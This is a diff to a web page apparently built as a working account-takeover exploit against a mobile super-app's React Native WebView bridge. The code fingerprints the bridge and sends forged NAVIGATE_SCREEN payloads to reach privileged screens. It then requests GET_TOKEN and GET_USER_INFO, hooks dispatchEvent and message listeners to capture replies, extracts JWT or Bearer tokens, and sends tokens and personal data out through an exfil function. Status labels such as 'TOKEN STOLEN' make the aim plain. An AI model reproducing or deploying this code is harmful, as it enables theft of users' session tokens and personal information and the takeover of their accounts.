@@ -12,15 +12,19 @@ h3 { margin: 4px 0 8px; font-size: 16px; }
 .phase.active { border-left-color: #fbbc04; }
 .phase.fail { border-left-color: #ea4335; }
 button { margin: 4px 4px 4px 0; padding: 8px 12px; font-size: 13px; border: 1px solid #ccc; border-radius: 4px; background: #fff; }
-#token { white-space: pre-wrap; word-break: break-all; font-size: 11px; background: #fff; padding: 8px; border-radius: 4px; max-height: 20vh; overflow: auto; }
-#log { font-size: 11px; color: #333; white-space: pre-wrap; word-break: break-all; max-height: 40vh; overflow: auto; background: #fff; padding: 8px; border-radius: 4px; margin-top: 8px; }
+#token, #finger { white-space: pre-wrap; word-break: break-all; font-size: 11px; background: #fff; padding: 8px; border-radius: 4px; }
+#token { max-height: 18vh; overflow: auto; }
+#log { font-size: 11px; color: #333; white-space: pre-wrap; word-break: break-all; max-height: 32vh; overflow: auto; background: #fff; padding: 8px; border-radius: 4px; margin-top: 8px; }
+#href { font-size: 11px; color: #666; word-break: break-all; margin-bottom: 8px; }
 </style>
 </head>
 <body>
 <h3 id="status">Đang tải...</h3>
-<div id="phase1" class="phase">① MiniApp bridge</div>
-<div id="phase2" class="phase">② NAVIGATE_SCREEN → AppWebviewScreen</div>
-<div id="phase3" class="phase">③ GET_TOKEN / GET_USER_INFO</div>
+<div id="href"></div>
+<div id="phase1" class="phase">① fingerprint bridge</div>
+<div id="phase2" class="phase">② NAVIGATE_SCREEN (navigate, no replace)</div>
+<div id="phase3" class="phase">③ steal GET_TOKEN / GET_USER_INFO</div>
+<pre id="finger"></pre>
 <pre id="token"></pre>
 <div id="buttons"></div>
 <div id="log"></div>
@@ -31,8 +35,13 @@ var qs = new URLSearchParams(location.search);
 var STAGE = qs.get('stage') || '';
 var logEl = document.getElementById('log');
 var tokenEl = document.getElementById('token');
+var fingerEl = document.getElementById('finger');
 var stolen = null;
 var gotToken = false;
+var bridgeKind = 'unknown';
+var navAttempt = 0;
+
+document.getElementById('href').textContent = location.href;
 
 function log(msg) {
   var line = new Date().toISOString().substr(11, 12) + ' ' + msg;
@@ -67,17 +76,21 @@ function sendEvent(event, data) {
 }
 
 function pullToken(obj, depth) {
-  if (!obj || depth > 4) return null;
+  if (!obj || depth > 5) return null;
   if (typeof obj === 'string' && obj.length > 20) {
     if (obj.indexOf('eyJ') === 0 || obj.indexOf('Bearer ') === 0) return obj;
   }
   if (typeof obj !== 'object') return null;
-  if (typeof obj.token === 'string' && obj.token.length > 8) return obj.token;
-  if (typeof obj.access_token === 'string') return obj.access_token;
-  if (typeof obj.accessToken === 'string') return obj.accessToken;
-  var keys = ['data', 'user', 'userdata', 'result'];
+  var keys = Object.keys(obj);
   for (var i = 0; i < keys.length; i++) {
-    var t = pullToken(obj[keys[i]], depth + 1);
+    var k = keys[i];
+    var v = obj[k];
+    if (typeof v === 'string' && v.length > 20 && (k.toLowerCase().indexOf('token') !== -1 || v.indexOf('eyJ') === 0)) {
+      return v;
+    }
+  }
+  for (var j = 0; j < keys.length; j++) {
+    var t = pullToken(obj[keys[j]], depth + 1);
     if (t) return t;
   }
   return null;
@@ -89,13 +102,35 @@ function showToken(tok, src) {
   setPhase('phase3', 'done', '③ TOKEN from ' + src + ' (' + tok.length + ' chars)');
   setStatus('TOKEN STOLEN');
   tokenEl.textContent = tok;
-  exfil('v02_token', { src: src, token: tok, href: location.href, stage: STAGE });
+  exfil('v02_token', { src: src, token: tok, href: location.href, stage: STAGE, bridge: bridgeKind });
+}
+
+function fingerprint(parsed) {
+  var data = parsed && parsed.data ? parsed.data : parsed;
+  if (!data || typeof data !== 'object') return;
+  var mini = !!(data.citizenNumber || data.fullName || data.phoneNumber);
+  var appwv = !!(data.id_number || data.phone_number || data.token);
+  if (data.token) {
+    bridgeKind = 'AppWebview/HubAirline (token field present)';
+    setPhase('phase1', 'done', '① AppWebview/HubAirline — token field in payload');
+    fingerEl.textContent = bridgeKind + '\n' + JSON.stringify(data).substring(0, 500);
+    return;
+  }
+  if (mini && !appwv) {
+    bridgeKind = 'MiniApp (GET_USER_INFO has no token)';
+    setPhase('phase1', 'fail', '① still MiniApp — GET_TOKEN will be dropped');
+    fingerEl.textContent = bridgeKind + '\n' + JSON.stringify(data).substring(0, 500);
+  } else if (appwv) {
+    bridgeKind = 'AppWebview/HubAirline (id_number shape, token empty)';
+    setPhase('phase1', 'done', '① AppWebview shape but token empty');
+    fingerEl.textContent = bridgeKind + '\n' + JSON.stringify(data).substring(0, 500);
+  }
 }
 
 function handleResponse(data, via) {
-  if (!data) return;
+  if (data == null || data === '') return;
   var raw = typeof data === 'string' ? data : JSON.stringify(data);
-  log('RECV ' + via + ': ' + raw.substring(0, 800));
+  log('RECV ' + via + ': ' + raw.substring(0, 900));
   exfil('diag_' + via, data);
 
   var parsed = data;
@@ -104,66 +139,83 @@ function handleResponse(data, via) {
   }
 
   var ev = parsed.event || parsed.type || '';
+  fingerprint(parsed);
+
   var tok = pullToken(parsed, 0);
   if (tok) {
-    showToken(tok, ev || via);
+    showToken(tok, (ev || via) + '/' + bridgeKind);
     return;
   }
-
-  if (ev === 'ON_GET_USER_INFO' || ev === 'ON_USER_INFO') {
-    setPhase('phase1', 'done', '① GET_USER_INFO ok (no token in MiniApp payload)');
-    exfil('v01_pii', parsed);
-  }
   if (ev === 'ON_TOKEN') {
-    setPhase('phase3', 'fail', '③ ON_TOKEN with no token field: ' + raw.substring(0, 200));
+    setPhase('phase3', 'fail', '③ ON_TOKEN with no token: ' + raw.substring(0, 180));
   }
 }
 
-window.addEventListener('message', function (e) {
-  handleResponse(e.data, 'message');
-});
-window.addEventListener('nativeMessage', function (e) {
-  handleResponse(e.detail, 'nativeMessage');
-});
-window.handleNativeMessage = function (data) {
-  handleResponse(data, 'handleNativeMessage');
-};
+function onAnyMessage(e) {
+  var payload = e.data;
+  if (payload == null && e.detail != null) payload = e.detail;
+  handleResponse(payload, e.currentTarget === document ? 'document.message' : (e.type + '@' + (e.currentTarget === window ? 'window' : 'other')));
+}
+
+window.addEventListener('message', onAnyMessage, true);
+document.addEventListener('message', onAnyMessage, true);
+window.addEventListener('nativeMessage', function (e) { handleResponse(e.detail, 'window.nativeMessage'); }, true);
+document.addEventListener('nativeMessage', function (e) { handleResponse(e.detail, 'document.nativeMessage'); }, true);
+window.handleNativeMessage = function (data) { handleResponse(data, 'handleNativeMessage'); };
+
+try {
+  var origDispatch = EventTarget.prototype.dispatchEvent;
+  EventTarget.prototype.dispatchEvent = function (ev) {
+    try {
+      if (ev && (ev.type === 'message' || ev.type === 'nativeMessage')) {
+        handleResponse(ev.data != null ? ev.data : ev.detail, 'dispatchEvent:' + ev.type);
+      }
+    } catch (_) {}
+    return origDispatch.apply(this, arguments);
+  };
+} catch (_) {}
 
 function tokenUrl() {
   var u = new URL(location.href);
   u.searchParams.set('stage', 'token');
+  u.searchParams.set('t', String(Date.now()));
   return u.toString();
 }
 
-function navigateToSteal(screenName) {
+function navigatePayloads(url) {
+  return [
+    { screen: 'AppWebviewScreen', params: { url: url, title: 'Xác thực' } },
+    { screen: 'AppWebviewScreen', params: { url: url, title: 'Xác thực' }, replace: false },
+    { screen: 'HubAirline', params: { url: url, title: 'Xác thực' } },
+    { screen: 'HomeLevel', params: { screen: 'AppWebviewScreen', params: { url: url, title: 'Xác thực' } } },
+    { screen: 'Home', params: { screen: 'AppWebviewScreen', params: { url: url, title: 'Xác thực' } } },
+    { screen: 'Main', params: { screen: 'AppWebviewScreen', params: { url: url, title: 'Xác thực' } } }
+  ];
+}
+
+function navigateToSteal(which) {
   var url = tokenUrl();
-  setPhase('phase2', 'active', '② navigate ' + screenName);
+  var all = navigatePayloads(url);
+  var payload = typeof which === 'number' ? all[which] : { screen: which, params: { url: url, title: 'Xác thực' } };
+  navAttempt++;
+  setPhase('phase2', 'active', '② nav#' + navAttempt + ' ' + payload.screen + (payload.replace ? ' REPLACE' : ' navigate'));
   log('navigate url=' + url);
-  sendEvent('NAVIGATE_SCREEN', {
-    screen: screenName,
-    name: screenName,
-    replace: true,
-    params: {
-      url: url,
-      title: 'Xác thực',
-      replace: true,
-      screen: { url: url, title: 'Xác thực' }
-    }
-  });
+  sendEvent('NAVIGATE_SCREEN', payload);
 }
 
 function stealNow() {
   setPhase('phase3', 'active', '③ GET_TOKEN + GET_USER_INFO');
   sendEvent('GET_TOKEN', { transId: 'ato-' + Date.now() });
-  setTimeout(function () { sendEvent('GET_USER_INFO', {}); }, 400);
+  setTimeout(function () { sendEvent('GET_USER_INFO', {}); }, 300);
+  setTimeout(function () { sendEvent('GET_TOKEN', { transId: 'ato2-' + Date.now() }); }, 900);
   setTimeout(function () {
-    if (!gotToken) setPhase('phase3', 'fail', '③ no token after 8s — still MiniApp, or AppWebviewScreen did not reply');
+    if (!gotToken) setPhase('phase3', 'fail', '③ no token after 8s — ' + bridgeKind);
   }, 8000);
 }
 
 function waitBridge(cb) {
   if (window.ReactNativeWebView && window.ReactNativeWebView.postMessage) {
-    log('ReactNativeWebView ready stage=' + (STAGE || 'miniapp'));
+    log('ReactNativeWebView ready stage=' + (STAGE || 'miniapp') + ' href=' + location.href);
     cb();
     return;
   }
@@ -171,17 +223,26 @@ function waitBridge(cb) {
 }
 
 function runMiniApp() {
-  setStatus('MiniApp — jumping to AppWebviewScreen');
-  setPhase('phase1', 'active', '① GET_USER_INFO baseline');
+  setStatus('MiniApp — fingerprint then navigate (NO replace)');
+  setPhase('phase1', 'active', '① GET_USER_INFO fingerprint');
   sendEvent('GET_USER_INFO', {});
   sendEvent('GET_TOKEN', { transId: 'probe-miniapp' });
-  setTimeout(function () { navigateToSteal('AppWebviewScreen'); }, 1200);
+  var payloads = navigatePayloads(tokenUrl());
+  payloads.forEach(function (p, i) {
+    setTimeout(function () {
+      if (gotToken) return;
+      if (STAGE === 'token') return;
+      setPhase('phase2', 'active', '② nav#' + (i + 1) + ' ' + p.screen);
+      log('auto nav ' + JSON.stringify(p));
+      sendEvent('NAVIGATE_SCREEN', p);
+    }, 1500 + i * 1800);
+  });
 }
 
 function runTokenStage() {
-  setStatus('AppWebviewScreen stage — stealing token');
-  setPhase('phase1', 'done', '① skipped (already navigated)');
-  setPhase('phase2', 'done', '② loaded with stage=token');
+  setStatus('stage=token — this MUST be AppWebviewScreen/HubAirline');
+  setPhase('phase1', 'done', '① URL has stage=token');
+  setPhase('phase2', 'done', '② loaded token stage (new WebView)');
   stealNow();
 }
 
@@ -189,8 +250,10 @@ var btnBox = document.getElementById('buttons');
 [
   { label: 'GET_TOKEN now', fn: function () { sendEvent('GET_TOKEN', { transId: 'manual' }); } },
   { label: 'GET_USER_INFO', fn: function () { sendEvent('GET_USER_INFO', {}); } },
-  { label: 'Jump AppWebviewScreen', fn: function () { navigateToSteal('AppWebviewScreen'); } },
-  { label: 'Jump HubAirline', fn: function () { navigateToSteal('HubAirline'); } }
+  { label: 'Nav AppWebviewScreen', fn: function () { navigateToSteal(0); } },
+  { label: 'Nav HubAirline', fn: function () { navigateToSteal(2); } },
+  { label: 'Nav nested HomeLevel', fn: function () { navigateToSteal(3); } },
+  { label: 'Nav nested Main', fn: function () { navigateToSteal(5); } }
 ].forEach(function (item) {
   var b = document.createElement('button');
   b.textContent = item.label;
@@ -200,7 +263,6 @@ var btnBox = document.getElementById('buttons');
 
 setTimeout(function () {
   waitBridge(function () {
-    setPhase('phase1', 'done', '① bridge ready');
     if (STAGE === 'token') runTokenStage();
     else runMiniApp();
   });
